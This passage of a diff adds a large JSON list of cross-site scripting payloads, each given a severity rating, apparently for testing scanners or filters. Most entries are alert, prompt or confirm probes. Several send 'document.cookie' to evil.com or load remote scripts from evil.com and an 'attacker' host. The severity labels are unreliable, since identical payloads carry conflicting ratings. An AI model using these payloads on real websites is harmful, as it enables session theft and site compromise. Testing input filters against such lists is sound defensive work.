+    "severity": "high"
+  },
+  {
+    "payload": "<img src=x onerror=alert(/XSS/.source)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<div onpointerover=confirm(26)>Hover me</div>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<script src='data:text/javascript,prompt(645)'></script>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<button onclick=prompt(887)>click</button>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=x:confirm(402)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<button onclick=prompt(395)>click</button>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<iframe srcdoc='<script>prompt(734)</script>'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<marquee onstart=alert(433)>XSS</marquee>",
+    "severity": "high"
+  },
+  {
+    "payload": "<style>@import 'javascript:alert(745)';</style>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=x onerror=prompt(/XSS/.source)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<details open ontoggle=confirm(322)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<div onpointerover=prompt(327)>Hover me</div>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src=# onmouseover='confirm(445)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<button onclick=prompt(608)>click</button>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<div style='width: expression(alert(770));'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=x onerror=confirm(142)>",
+    "severity": "low"
+  },
+  {
+    "payload": "javascript:prompt(document.domain)",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='x' onerror='eval(`confirm(459)`)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<div style=background:url('javascript:alert(300)')>",
+    "severity": "low"
+  },
+  {
+    "payload": "<div style='width: expression(alert(27));'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script>alert(153)</script>",
+    "severity": "low"
+  },
+  {
+    "payload": "<script>alert(474)</script>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<textarea onfocus=alert(826)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<a href='javascript:confirm(554)'>click</a>",
+    "severity": "high"
+  },
+  {
+    "payload": "<div style='width: expression(confirm(590));'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src='411' onerror='prompt(411)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<a href='javascript:confirm(204)'>click</a>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<video><source onerror='javascript:prompt(270)'></video>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='812' onerror='prompt(812)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<video><source onerror='javascript:confirm(246)'></video>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=x:confirm(647)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=x:alert(886)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<div onclick='prompt(document.cookie)'>Click</div>",
+    "severity": "low"
+  },
+  {
+    "payload": "javascript:alert(document.domain)",
+    "severity": "high"
+  },
+  {
+    "payload": "<script>document.write('<script>prompt(545)</script>')</script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<button onclick=alert(894)>click</button>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<audio src onerror=confirm(177)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<body onload=prompt('XSS')>",
+    "severity": "low"
+  },
+  {
+    "payload": "<button onclick=prompt(70)>click</button>",
+    "severity": "low"
+  },
+  {
+    "payload": "<div style='width: expression(alert(407));'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
+    "severity": "high"
+  },
+  {
+    "payload": "<object data='javascript:prompt(154)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<object type='text/x-scriptlet' data='http://attacker/xss.sct'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<style>@import 'javascript:alert(18)';</style>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<div onpointerover=prompt(40)>Hover me</div>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='x' onerror='this.onerror=null;prompt(563)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<svg><desc><![CDATA[</desc><script>alert(891)</script>]]></svg>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<body onload=alert('XSS')>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src='x' onerror='this.onerror=null;prompt(809)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<div style=background:url('javascript:confirm(453)')>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<meta charset='x' onerror='confirm(831)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='x' onerror='eval(`prompt(593)`)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src=x:prompt(175)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<input type='image' src='x' onerror=alert(697)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<textarea onfocus=prompt(366)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<svg><a xlink:href='javascript:alert(171)'>X</a></svg>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=x:confirm(621)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<div onclick='alert(document.cookie)'>Click</div>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src='x' onerror='this.onerror=null;confirm(864)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<svg><script>prompt(28)</script></svg>",
+    "severity": "high"
+  },
+  {
+    "payload": "<object type='text/x-scriptlet' data='http://attacker/xss.sct'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<form><button formaction='javascript:prompt(433)'>Click</button></form>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<textarea onfocus=prompt(342)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<details open ontoggle=confirm(420)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src=x onerror=prompt(180)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<math><mi><script>prompt(858)</script></mi></math>",
+    "severity": "low"
+  },
+  {
+    "payload": "<svg><a xlink:href='javascript:prompt(168)'>X</a></svg>",
+    "severity": "low"
+  },
+  {
+    "payload": "<svg><desc><![CDATA[</desc><script>prompt(492)</script>]]></svg>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<b onmouseover=alert(948)>XSS</b>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<body onload=prompt('XSS')>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<marquee onstart=alert(306)>XSS</marquee>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<svg><desc><![CDATA[</desc><script>confirm(837)</script>]]></svg>",
+    "severity": "low"
+  },
+  {
+    "payload": "<svg/onload=confirm(926)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<svg><desc><![CDATA[</desc><script>alert(573)</script>]]></svg>",
+    "severity": "low"
+  },
+  {
+    "payload": "<script src='data:text/javascript,alert(729)'></script>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<link rel='stylesheet' href='javascript:prompt(468)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<body onload=alert('XSS')>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<div style='width: expression(alert(571));'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<script src='data:text/javascript,confirm(921)'></script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<input type='image' src='x' onerror=prompt(691)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script>document.write('<script>prompt(938)</script>')</script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='x' onerror='eval(`prompt(45)`)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<meta http-equiv='refresh' content='0;url=javascript:prompt(205)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<svg><script>alert(992)</script></svg>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src='x' onerror=confirm(676)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<object data='javascript:confirm(669)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<audio src onerror=alert(469)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<svg><desc><![CDATA[</desc><script>prompt(50)</script>]]></svg>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=# onmouseover='prompt(70)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src='x' onerror=confirm(32)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<svg/onload=confirm(915)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<script>document.write('<script>confirm(287)</script>')</script>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<video><source onerror='javascript:confirm(436)'></video>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<link rel='stylesheet' href='javascript:prompt(59)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<svg><desc><![CDATA[</desc><script>prompt(281)</script>]]></svg>",
+    "severity": "low"
+  },
+  {
+    "payload": "<meta http-equiv='refresh' content='0;url=javascript:alert(138)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<b onmouseover=confirm(454)>XSS</b>",
+    "severity": "high"
+  },
+  {
+    "payload": "<math><mi><script>alert(881)</script></mi></math>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<svg/onload=confirm(55)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script src='data:text/javascript,confirm(301)'></script>",
+    "severity": "low"
+  },
+  {
+    "payload": "<svg/onload=prompt(859)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src='data:image/svg+xml,<svg onload=confirm(411)>'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script src='data:text/javascript,confirm(688)'></script>",
+    "severity": "low"
+  },
+  {
+    "payload": "<input type='image' src='x' onerror=alert(662)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<svg/onload=alert(620)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<table background='javascript:alert(148)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<embed src='data:text/html,<script>confirm(396)</script>'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
+    "severity": "low"
+  },
+  {
+    "payload": "<iframe src='javascript:confirm(774)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='x' onerror='this.onerror=null;confirm(617)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<body onload=confirm('XSS')>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=x onerror=prompt(/XSS/.source)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<button onclick=alert(802)>click</button>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<body onload=alert('XSS')>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src=x onerror=alert(/XSS/.source)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<svg><a xlink:href='javascript:alert(902)'>X</a></svg>",
+    "severity": "low"
+  },
+  {
+    "payload": "<meta charset='x' onerror='prompt(367)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "low"
+  },
+  {
+    "payload": "<object data='javascript:prompt(678)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<input type='image' src='x' onerror=prompt(908)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<math><mi><script>alert(517)</script></mi></math>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<style>@import 'javascript:confirm(244)';</style>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src='x' onerror=confirm(621)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<audio src onerror=confirm(932)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<a href='javascript:prompt(143)'>click</a>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<button onclick=confirm(639)>click</button>",
+    "severity": "high"
+  },
+  {
+    "payload": "<textarea onfocus=alert(232)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<style>@import 'javascript:prompt(983)';</style>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<link rel='stylesheet' href='javascript:confirm(866)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src=x onerror=prompt(89)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<input autofocus onfocus=alert(655)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<div onclick='confirm(document.cookie)'>Click</div>",
+    "severity": "low"
+  },
+  {
+    "payload": "<link rel='stylesheet' href='javascript:confirm(945)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<iframe srcdoc='<script>alert(525)</script>'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<script>confirm(856)</script>",
+    "severity": "low"
+  },
+  {
+    "payload": "<meta http-equiv='refresh' content='0;url=javascript:confirm(588)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src=x:confirm(94)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script>location='https://evil.com?cookie='+document.cookie</script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script>location='https://evil.com?cookie='+document.cookie</script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<svg><script>prompt(251)</script></svg>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<b onmouseover=confirm(734)>XSS</b>",
+    "severity": "low"
+  },
+  {
+    "payload": "<div style='width: expression(prompt(177));'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='x' onerror='eval(`prompt(501)`)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=x:confirm(932)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<button onclick=confirm(516)>click</button>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='x' onerror='this.onerror=null;confirm(148)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<div style=background:url('javascript:confirm(536)')>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='2' onerror='prompt(2)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<math><mi><script>prompt(377)</script></mi></math>",
+    "severity": "high"
+  },
+  {
+    "payload": "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=# onmouseover='alert(604)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<marquee onstart=alert(68)>XSS</marquee>",
+    "severity": "high"
+  },
+  {
+    "payload": "<embed src='data:text/html,<script>confirm(95)</script>'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<svg/onload=confirm(238)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src='data:image/svg+xml,<svg onload=alert(288)>'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<embed src='data:text/html,<script>alert(390)</script>'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<input autofocus onfocus=confirm(827)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<table background='javascript:prompt(409)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='x' onerror='eval(`confirm(327)`)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<audio src onerror=alert(794)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<svg/onload=alert(623)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src=x onerror=confirm(142)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<marquee onstart=confirm(36)>XSS</marquee>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<table background='javascript:confirm(56)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<script>document.write('<script>prompt(658)</script>')</script>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<form><button formaction='javascript:confirm(667)'>Click</button></form>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<div onclick='alert(document.cookie)'>Click</div>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='x' onerror='this.onerror=null;prompt(655)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<img src=# onmouseover='prompt(377)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='x' onerror=confirm(338)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='data:image/svg+xml,<svg onload=alert(646)>'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src='x' onerror=confirm(860)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<svg><a xlink:href='javascript:alert(981)'>X</a></svg>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='x' onerror='eval(`alert(677)`)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<form><button formaction='javascript:prompt(409)'>Click</button></form>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<button onclick=alert(569)>click</button>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script>alert(913)</script>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<marquee onstart=confirm(941)>XSS</marquee>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<input autofocus onfocus=prompt(315)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<script>prompt(425)</script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<meta http-equiv='refresh' content='0;url=javascript:confirm(225)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<script src='data:text/javascript,alert(245)'></script>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<link rel='stylesheet' href='javascript:alert(205)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src='x' onerror=confirm(424)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script src='//evil.com/xss.js'></script>",
+    "severity": "low"
+  },
+  {
+    "payload": "<meta charset='x' onerror='alert(669)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<script src='data:text/javascript,alert(761)'></script>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<a href='javascript:alert(192)'>click</a>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<object type='text/x-scriptlet' data='http://attacker/xss.sct'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<style>@import 'javascript:alert(605)';</style>",
+    "severity": "low"
+  },
+  {
+    "payload": "<object data='javascript:confirm(500)'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<math><mi><script>confirm(410)</script></mi></math>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<svg><script>prompt(233)</script></svg>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<svg/onload=confirm(410)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<embed src='data:text/html,<script>prompt(761)</script>'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
+    "severity": "low"
+  },
+  {
+    "payload": "<script>document.write('<script>confirm(535)</script>')</script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<form><button formaction='javascript:prompt(304)'>Click</button></form>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src='x' onerror=confirm(119)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<script>document.write('<script>confirm(716)</script>')</script>",
+    "severity": "high"
+  },
+  {
+    "payload": "<body onload=alert('XSS')>",
+    "severity": "low"
+  },
+  {
+    "payload": "<embed src='data:text/html,<script>prompt(94)</script>'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<div onpointerover=prompt(617)>Hover me</div>",
+    "severity": "low"
+  },
+  {
+    "payload": "<link rel='stylesheet' href='javascript:confirm(756)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<svg><script>prompt(746)</script></svg>",
+    "severity": "high"
+  },
+  {
+    "payload": "<embed src='data:text/html,<script>prompt(86)</script>'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<img src='x' onerror='eval(`alert(424)`)'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<form><button formaction='javascript:prompt(674)'>Click</button></form>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<math><mi><script>prompt(442)</script></mi></math>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<div style=background:url('javascript:confirm(424)')>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='data:image/svg+xml,<svg onload=confirm(422)>'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<a href='javascript:confirm(507)'>click</a>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<div onpointerover=alert(718)>Hover me</div>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<b onmouseover=alert(195)>XSS</b>",
+    "severity": "low"
+  },
+  {
+    "payload": "<input type='image' src='x' onerror=alert(27)>",
+    "severity": "low"
+  },
+  {
+    "payload": "<script>alert(330)</script>",
+    "severity": "medium"
+  },
+  {
+    "payload": "javascript:prompt(document.domain)",
+    "severity": "critical"
+  },
+  {
+    "payload": "<body onload=confirm('XSS')>",
+    "severity": "high"
+  },
+  {
+    "payload": "<embed src='data:text/html,<script>prompt(354)</script>'>",
+    "severity": "low"
+  },
+  {
+    "payload": "<script>document.write('<script>alert(300)</script>')</script>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<object type='text/x-scriptlet' data='http://attacker/xss.sct'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
+    "severity": "low"
+  },
+  {
+    "payload": "<div onclick='confirm(document.cookie)'>Click</div>",
+    "severity": "low"
+  },
+  {
+    "payload": "<textarea onfocus=confirm(169)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<object data='javascript:alert(123)'>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<audio src onerror=alert(391)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<form><button formaction='javascript:confirm(346)'>Click</button></form>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=x onerror=prompt(847)>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src=x:confirm(48)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<style>@import 'javascript:prompt(726)';</style>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<div style='width: expression(prompt(550));'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<img src='data:image/svg+xml,<svg onload=prompt(561)>'>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<svg/onload=alert(297)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<meta http-equiv='refresh' content='0;url=javascript:alert(291)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<math><mi><script>prompt(639)</script></mi></math>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src=x onerror=confirm(/XSS/.source)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<img src='37' onerror='prompt(37)'>",
+    "severity": "high"
+  },
+  {
+    "payload": "<textarea onfocus=confirm(907)>",
+    "severity": "critical"
+  },
+  {
+    "payload": "<svg><a xlink:href='javascript:prompt(13)'>X</a></svg>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<input type='image' src='x' onerror=confirm(160)>",
+    "severity": "medium"
+  },
+  {
+    "payload": "<input autofocus onfocus=confirm(182)>",
+    "severity": "critical"
+  }
 ]
